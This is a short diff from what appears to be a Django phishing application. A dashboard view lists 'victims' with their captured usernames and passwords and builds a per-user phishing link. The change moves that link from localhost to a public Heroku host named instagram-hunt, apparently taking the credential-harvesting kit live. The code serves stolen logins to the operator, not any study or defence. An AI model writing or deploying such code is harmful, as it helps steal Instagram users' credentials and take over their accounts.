@@ -37,7 +37,7 @@ def dashboard(request):
         victims.update({victimdata[i].username:victimdata[i].password})
 
 
-    purl= f"127.0.0.1:8000/{token}"
+    purl= f"https://instagram-hunt.herokuapp.com/{token}"
     data = {"username":username,"purl":purl,"victims":victims,"r_url":r_url}
 
     return render(request,"dashboard.html",data)
